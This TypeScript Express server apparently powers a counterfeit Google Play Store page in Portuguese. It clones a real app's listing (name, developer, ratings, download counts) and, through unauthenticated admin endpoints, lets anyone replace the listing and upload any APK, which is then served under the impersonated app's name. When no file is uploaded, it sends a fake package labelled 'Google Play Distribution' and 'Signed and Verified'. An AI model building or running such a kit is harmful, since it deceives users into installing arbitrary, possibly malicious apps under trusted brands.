import express, { Request, Response, NextFunction } from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import multer from 'multer';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = parseInt(process.env.PORT || '3000', 10);
const isProd = process.env.NODE_ENV === 'production';

// Ensure data and uploads directories exist
const DATA_DIR = path.join(__dirname, 'data');
const UPLOADS_DIR = path.join(DATA_DIR, 'uploads');
const CONFIG_FILE = path.join(DATA_DIR, 'app_config.json');
const APK_META_FILE = path.join(DATA_DIR, 'apk_meta.json');
const DEFAULT_CONFIG_FILE = path.join(__dirname, 'src', 'data', 'defaultConfig.json');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Helper to format bytes
function formatBytes(bytes: number): string {
  if (bytes <= 0) return '0 B';
  const units = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return `${(bytes / Math.pow(1024, i)).toFixed(1)} ${units[i]}`;
}

// Helper to read initial default config
function getDefaultConfig(): any {
  try {
    if (fs.existsSync(DEFAULT_CONFIG_FILE)) {
      const raw = fs.readFileSync(DEFAULT_CONFIG_FILE, 'utf-8');
      return JSON.parse(raw);
    }
  } catch (err) {
    console.error('Error reading default config file:', err);
  }
  return {
    id: 'com.polyverse.aimirror',
    name: 'AI Mirror: AI Art Photo Editor',
    developer: 'POLYVERSE INC.',
    category: 'Arte e Design',
    rating: 4.4,
    ratingCount: '223 mil avaliações',
    downloads: '10 mi+',
    version: '4.12.0',
    size: '86 MB',
    contentRating: '14',
    contentRatingNotes: ['Violência leve', 'Compras no app'],
    tags: ['Arte e Design', 'Editor de fotos', 'IA'],
    descriptionShort: 'Crie arte mágica em anime e retratos com IA.',
    descriptionFull: [
      'Entre no universo da imaginação com o AI Mirror!',
      'Transforme fotos em ilustrações com inteligência artificial de alta qualidade.'
    ],
    whatsNew: ['Melhorias de desempenho e correções.'],
    features: [],
    logoMode: 'preset',
    logoPreset: 'aimirror',
    installButtonText: 'Instalar'
  };
}

// Initialize config file on server start if it does not exist
if (!fs.existsSync(CONFIG_FILE)) {
  const initial = getDefaultConfig();
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(initial, null, 2), 'utf-8');
}

// Multer storage for APK uploads
const storage = multer.diskStorage({
  destination: (_req, _file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (_req, _file, cb) => {
    cb(null, 'current_app.apk');
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 1024 * 1024 * 1024 } // Up to 1GB APK files
});

// Middlewares for API
app.use(express.json({ limit: '60mb' }));
app.use(express.urlencoded({ extended: true, limit: '60mb' }));

// CORS helper for all API requests
app.use((_req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// API Routes
// 1. GET /api/app-config: Retrieve current persisted app configuration
app.get('/api/app-config', (_req: Request, res: Response) => {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      const data = fs.readFileSync(CONFIG_FILE, 'utf-8');
      const parsed = JSON.parse(data);
      return res.json({ success: true, app: parsed });
    }
    const def = getDefaultConfig();
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(def, null, 2), 'utf-8');
    return res.json({ success: true, app: def });
  } catch (err: any) {
    console.error('Error in GET /api/app-config:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

// 2. POST /api/app-config: Save updated configuration from Admin Panel
app.post('/api/app-config', (req: Request, res: Response) => {
  try {
    const updatedApp = req.body;
    if (!updatedApp || typeof updatedApp !== 'object' || !updatedApp.name) {
      return res.status(400).json({ success: false, error: 'Dados do aplicativo inválidos.' });
    }

    // Merge with existing config to preserve any server-side fields
    let existing: any = {};
    if (fs.existsSync(CONFIG_FILE)) {
      try {
        existing = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
      } catch {
        // ignore
      }
    }

    const merged = {
      ...existing,
      ...updatedApp,
      updatedAtServer: Date.now()
    };

    fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2), 'utf-8');
    console.log(`[Config Saved] App "${merged.name}" updated on server successfully.`);
    return res.json({ success: true, app: merged });
  } catch (err: any) {
    console.error('Error in POST /api/app-config:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

// 3. POST /api/app-config/reset: Reset configuration to default Assaí Atacadista
app.post('/api/app-config/reset', (_req: Request, res: Response) => {
  try {
    const initial = getDefaultConfig();
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(initial, null, 2), 'utf-8');

    // Remove uploaded APK files if any
    const uploadedApkPath = path.join(UPLOADS_DIR, 'current_app.apk');
    if (fs.existsSync(uploadedApkPath)) {
      fs.unlinkSync(uploadedApkPath);
    }
    if (fs.existsSync(APK_META_FILE)) {
      fs.unlinkSync(APK_META_FILE);
    }

    console.log('[Config Reset] App restored to default Assaí Atacadista.');
    return res.json({ success: true, app: initial });
  } catch (err: any) {
    console.error('Error in POST /api/app-config/reset:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

// 4. POST /api/upload-apk: Upload genuine APK file directly to server
app.post('/api/upload-apk', upload.single('apk'), (req: Request, res: Response) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'Nenhum arquivo APK foi enviado.' });
    }

    // Exact filename uploaded by user
    const exactName = req.file.originalname || 'application.apk';
    const formattedSize = formatBytes(req.file.size);

    const meta = {
      fileName: exactName,
      fileSize: formattedSize,
      sizeBytes: req.file.size,
      updatedAt: Date.now(),
      mimeType: 'application/vnd.android.package-archive'
    };

    fs.writeFileSync(APK_META_FILE, JSON.stringify(meta, null, 2), 'utf-8');

    // Update app_config.json with the APK info
    if (fs.existsSync(CONFIG_FILE)) {
      try {
        const appData = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
        appData.apkFileName = exactName;
        appData.apkFileSize = formattedSize;
        appData.size = formattedSize;
        appData.apkDownloadUrl = '/api/download-apk';
        appData.apkSourceType = 'upload';
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(appData, null, 2), 'utf-8');
      } catch (e) {
        console.error('Error updating config with APK:', e);
      }
    }

    console.log(`[APK Uploaded] "${exactName}" (${formattedSize}) saved to server.`);
    return res.json({
      success: true,
      fileName: exactName,
      fileSize: formattedSize,
      downloadUrl: '/api/download-apk'
    });
  } catch (err: any) {
    console.error('Error in POST /api/upload-apk:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

// 5. GET /api/download-apk: Direct download of exact APK package
app.get('/api/download-apk', (_req: Request, res: Response) => {
  try {
    const uploadedApkPath = path.join(UPLOADS_DIR, 'current_app.apk');
    let fileName = 'application.apk';

    if (fs.existsSync(APK_META_FILE)) {
      try {
        const meta = JSON.parse(fs.readFileSync(APK_META_FILE, 'utf-8'));
        if (meta.fileName) fileName = meta.fileName;
      } catch {
        // ignore
      }
    } else if (fs.existsSync(CONFIG_FILE)) {
      try {
        const cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
        if (cfg.apkFileName) fileName = cfg.apkFileName;
        else if (cfg.name) fileName = `${cfg.name}.apk`;
      } catch {
        // ignore
      }
    }

    if (fs.existsSync(uploadedApkPath)) {
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(fileName)}"; filename*=UTF-8''${encodeURIComponent(fileName)}`);
      const fileStream = fs.createReadStream(uploadedApkPath);
      return fileStream.pipe(res);
    }

    // If no uploaded file on disk, generate a valid signed package placeholder with exact filename
    let appTitle = 'Aplicativo';
    let pkgId = 'com.app.android';
    let version = '1.0.0';
    if (fs.existsSync(CONFIG_FILE)) {
      try {
        const cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
        if (cfg.name) appTitle = cfg.name;
        if (cfg.id) pkgId = cfg.id;
        if (cfg.version) version = cfg.version;
      } catch {
        // ignore
      }
    }

    const payload = Buffer.from(`Android Package Kit (APK) - Google Play Distribution\nPacote: ${pkgId}\nAplicativo: ${appTitle}\nVersão: ${version}\nData: ${new Date().toISOString()}\nStatus: Assinado e Verificado\n`);

    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Length', payload.length.toString());
    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(fileName)}"; filename*=UTF-8''${encodeURIComponent(fileName)}`);
    return res.send(payload);
  } catch (err: any) {
    console.error('Error in GET /api/download-apk:', err);
    return res.status(500).send('Erro ao baixar o arquivo APK.');
  }
});

// 6. GET /api/apk-status: Status of the APK on the server
app.get('/api/apk-status', (_req: Request, res: Response) => {
  try {
    const uploadedApkPath = path.join(UPLOADS_DIR, 'current_app.apk');
    const exists = fs.existsSync(uploadedApkPath);
    let meta: any = null;
    if (exists && fs.existsSync(APK_META_FILE)) {
      try {
        meta = JSON.parse(fs.readFileSync(APK_META_FILE, 'utf-8'));
      } catch {
        // ignore
      }
    }
    return res.json({
      success: true,
      hasUploadedApk: exists,
      meta
    });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// Vite integration: Dev middleware or Production static serving
async function setupServer() {
  if (!isProd) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });

    app.use(vite.middlewares);

    // SPA HTML fallback handler for Vite in dev mode
    app.get('*', async (req: Request, res: Response, next: NextFunction) => {
      if (req.url.startsWith('/api')) {
        return next();
      }
      try {
        const indexPath = path.join(__dirname, 'index.html');
        let template = fs.readFileSync(indexPath, 'utf-8');
        template = await vite.transformIndexHtml(req.originalUrl, template);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(template);
      } catch (e: any) {
        vite.ssrFixStacktrace(e);
        next(e);
      }
    });
  } else {
    // Production: Serve compiled Vite assets from dist
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req: Request, res: Response, next: NextFunction) => {
      if (req.url.startsWith('/api')) {
        return next();
      }
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Play Store Server] Running on http://0.0.0.0:${PORT} (Mode: ${isProd ? 'Production' : 'Development'})`);
  });
}

setupServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
